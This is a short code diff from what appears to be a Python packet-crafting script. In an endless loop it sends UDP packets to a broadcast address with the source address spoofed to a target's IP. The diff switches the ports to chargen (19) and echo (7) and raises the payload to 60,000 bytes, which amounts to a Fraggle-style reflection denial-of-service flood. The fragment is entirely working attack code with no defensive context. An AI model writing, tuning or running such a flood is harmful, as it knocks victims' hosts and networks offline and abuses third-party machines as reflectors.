@@ -20,5 +20,5 @@ broadcast = raw_input("Enter the broadcast address to send to: ")
 while True:
     # rand_addr = address_spoofer()
     ip_hdr = IP(src=target, dst=broadcast)
-    packet = ip_hdr / UDP(sport=6942, dport=8085) / ("m" * 600)  # send 60k bytes of junk
+    packet = ip_hdr / UDP(sport=19, dport=7) / ("Y" * 60000)
     send(packet)
